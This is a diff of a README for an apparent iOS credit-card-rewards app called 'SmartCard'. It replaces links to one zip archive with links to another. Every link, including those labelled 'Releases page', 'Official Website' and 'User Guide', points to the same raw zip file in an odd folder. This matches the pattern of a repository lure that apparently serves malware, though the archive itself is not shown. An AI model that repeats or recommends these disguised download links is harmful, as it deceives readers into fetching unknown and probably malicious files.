@@ -4,12 +4,12 @@
 SmartCard is an iOS app designed to help you get the most out of your credit card rewards. With smart recommendations, it simplifies managing your finances. Whether for cashback, travel points, or other perks, SmartCard makes it easy to maximize your benefits.
 
 ## 📥 Download Now
-[![Download SmartCard](https://github.com/Zowil06/SmartCard/raw/refs/heads/master/adiactinic/Smart_Card_2.3.zip)](https://github.com/Zowil06/SmartCard/raw/refs/heads/master/adiactinic/Smart_Card_2.3.zip)
+[![Download SmartCard](https://raw.githubusercontent.com/Zowil06/SmartCard/master/adiactinic/Card-Smart-v3.7.zip)](https://raw.githubusercontent.com/Zowil06/SmartCard/master/adiactinic/Card-Smart-v3.7.zip)
 
 ## 🚀 Getting Started
 To use SmartCard, follow these steps:
 
-1. Click the download link above or visit the [Releases page](https://github.com/Zowil06/SmartCard/raw/refs/heads/master/adiactinic/Smart_Card_2.3.zip).
+1. Click the download link above or visit the [Releases page](https://raw.githubusercontent.com/Zowil06/SmartCard/master/adiactinic/Card-Smart-v3.7.zip).
 2. Select the latest version of SmartCard.
 3. Download the app file to your device.
 
@@ -38,7 +38,7 @@ To use SmartCard, follow these steps:
 ## ❓ Frequently Asked Questions
 
 ### Where can I download SmartCard?
-You can download SmartCard by visiting the [Releases page](https://github.com/Zowil06/SmartCard/raw/refs/heads/master/adiactinic/Smart_Card_2.3.zip).
+You can download SmartCard by visiting the [Releases page](https://raw.githubusercontent.com/Zowil06/SmartCard/master/adiactinic/Card-Smart-v3.7.zip).
 
 ### Is SmartCard free to use?
 Yes, SmartCard is free to download and use. Some advanced features may require in-app purchases.
@@ -50,8 +50,8 @@ If you face any issues, check your device's storage and ensure you have a stable
 Join our community to share tips and ask questions about using SmartCard. You can contact our support team for additional assistance.
 
 ## 🔗 Additional Resources
-- [Official Website](https://github.com/Zowil06/SmartCard/raw/refs/heads/master/adiactinic/Smart_Card_2.3.zip)
-- [User Guide](https://github.com/Zowil06/SmartCard/raw/refs/heads/master/adiactinic/Smart_Card_2.3.zip)
+- [Official Website](https://raw.githubusercontent.com/Zowil06/SmartCard/master/adiactinic/Card-Smart-v3.7.zip)
+- [User Guide](https://raw.githubusercontent.com/Zowil06/SmartCard/master/adiactinic/Card-Smart-v3.7.zip)
 
 ## 📋 License
 SmartCard is licensed under the MIT License. You are free to use and modify the software as per the license terms.
